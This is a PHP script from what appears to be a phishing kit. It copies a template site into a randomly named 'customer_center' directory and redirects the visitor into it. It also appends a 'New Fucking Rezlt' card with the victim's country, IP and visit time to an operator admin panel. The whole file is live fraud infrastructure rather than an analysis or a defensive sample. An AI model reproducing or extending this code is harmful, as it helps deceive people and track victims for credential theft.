<?php
require "Xwanted/system/getdata.php";
for ($DIR = '', $i = 0, $z = strlen($a = '123456789')-1; $i != 6; $x = rand(0,$z), $DIR .= $a{$x}, $i++);
$src="./Xwanted";
$random = rand(0,100000).$_SERVER['REMOTE_ADDR'];
$dst		= "customer_center/user-".$DIR;
	
function recurse_copy($src, $dst) {

	$dir = opendir($src);
	$result = ($dir === false ? false : true);

	if ($result !== false) {
		$result = @mkdir($dst);

		if ($result === true) {
			while(false !== ( $file = readdir($dir)) ) { 
				if (( $file != '.' ) && ( $file != '..' ) && $result) { 
					if ( is_dir($src . '/' . $file) ) { 
						$result = recurse_copy($src . '/' . $file,$dst . '/' . $file); 
					} else { 
						$result = copy($src . '/' . $file,$dst . '/' . $file); 
					} 
				} 
			} 
			closedir($dir);
		}
	}

	return $result;
}

recurse_copy( $src, $dst );
header("location:".$dst."");


$path = "admin/data/data.html";
$content =
"<div class='card' style='width: 18rem;'>
<div class='card-body'>
<h5 class='card-title'>New Fucking Rezlt</h5>
<p class='card-text'><font style='color:#9c0000;'>✪</font> Country : <font style='color:#0070ba;'>$country</font></p><br>
<p class='card-text'><font style='color:#9c0000;'>✪</font> Ip : <font style='color:#0070ba;'>$ip</font></p><br>
<p class='card-text'><font style='color:#9c0000;'>✪</font> Time : <font style='color:#0070ba;'>$time</font></p><br>
<a href='ips/$ip.html' class='btn btn-primary'>Show</a>
</div>
</div>";
file_put_contents($path,$content, FILE_APPEND);
?>